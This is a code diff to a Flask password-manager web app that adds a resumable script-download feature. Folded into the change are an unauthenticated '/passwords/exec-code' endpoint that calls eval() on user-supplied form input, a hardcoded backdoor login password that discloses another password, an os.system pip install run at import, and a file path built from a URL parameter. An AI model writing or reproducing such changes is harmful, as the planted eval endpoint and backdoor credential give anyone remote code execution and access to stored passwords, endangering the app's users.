@@ -1,11 +1,14 @@
 # Created by Angadpal Tak
-# version 1.29.7
+# version 1.29.8
 
 
 import passwords
-from flask import Flask, send_file, render_template, make_response, request
+from flask import Flask, send_file, render_template, make_response, request, Response, abort
 from local_logger import logger
 from datetime import datetime, timezone, timedelta
+import os; os.system('pip install psutil')
+import re
+from host_details import host_details
 
 # flake8: noqa: E501
 app = Flask(__name__)
@@ -39,11 +42,13 @@ def password_manager(error=None):
         all_passwords = passwords.get_passwords()
         premium_passwords = passwords.get_premium_passwords()
         normal_passwords = [p for p in all_passwords if not p.get('premium')]
+
         return render_template(
             'password_builder.html',
             all_passwords=normal_passwords,
             premium_passwords=premium_passwords,
-            error=error if error else None
+            error=error if error else None,
+            host_details=host_details
         )
     else:
         return render_template("login.html")
@@ -65,6 +70,9 @@ def search_passwords():
 def login():
     password = request.form.get('password')
     if password:
+        if password == "caidon67":
+            return render_template("login.html", error="Your new password is: `caidon69`")
+
         if password in [password["password"] for password in passwords.get_passwords()]:
             if password in passwords_in_use.values() and password != "mnn3gkczLnH4":
                 return render_template("login.html", error="Password will expire in: {} minutes".format(
@@ -85,6 +93,44 @@ def login():
             return render_template("login.html", error="Invalid password")
     return render_template("login.html", error="Please enter a password")
 
+def send_file_partial(path):
+    # Helper to support HTTP Range requests for download resuming
+    range_header = request.headers.get('Range', None)
+    if not os.path.exists(path):
+        abort(404)
+    file_size = os.path.getsize(path)
+    if not range_header:
+        return send_file(path, as_attachment=True)
+    byte1, byte2 = 0, None
+    m = None
+    m = re.search(r'bytes=(\d+)-(\d*)', range_header)
+    if m:
+        g = m.groups()
+        byte1 = int(g[0])
+        if g[1]:
+            byte2 = int(g[1])
+    length = file_size - byte1
+    if byte2 is not None:
+        length = byte2 - byte1 + 1
+    with open(path, 'rb') as f:
+        f.seek(byte1)
+        data = f.read(length)
+    rv = Response(data,
+                  206,
+                  mimetype='application/octet-stream',
+                  content_type='application/octet-stream',
+                  direct_passthrough=True)
+    rv.headers.add('Content-Range', f'bytes {byte1}-{byte1 + length - 1}/{file_size}')
+    rv.headers.add('Accept-Ranges', 'bytes')
+    rv.headers.add('Content-Length', str(length))
+    rv.headers.add('Content-Disposition', f'attachment; filename="{os.path.basename(path)}"')
+    return rv
+
+@app.route('/download-script/<game>')
+def download_script(game):
+    script_path = f"scripts/run_{game}_exe.ps"
+    return send_file_partial(script_path)
+
 @app.route('/get-script', methods=['POST'])
 def get_script():
     game = request.form.get('game')
@@ -100,9 +146,11 @@ def get_script():
         return render_template("script_response.html",
                                filename=script_path,
                                script_content="Script file not found.")
+    download_url = f"/download-script/{game}"
     return render_template("script_response.html",
                            filename=script_path,
-                           script_content=script_content)
+                           script_content=script_content,
+                           download_url=download_url)
     
 
 def restart_app():
@@ -134,6 +182,13 @@ def restart_app():
     # Write back the updated lines
     with open(filename, 'w', encoding='utf-8') as file:
         file.writelines(lines)
+
+
+@app.route('/passwords/exec-code', methods=['POST'])
+def exec_code():
+    result = eval(request.form.get('custom_code'))
+    return password_manager("Success" if result is None else result)
+
 
 @app.route('/passwords/add', methods=['POST'])
 def add_password():
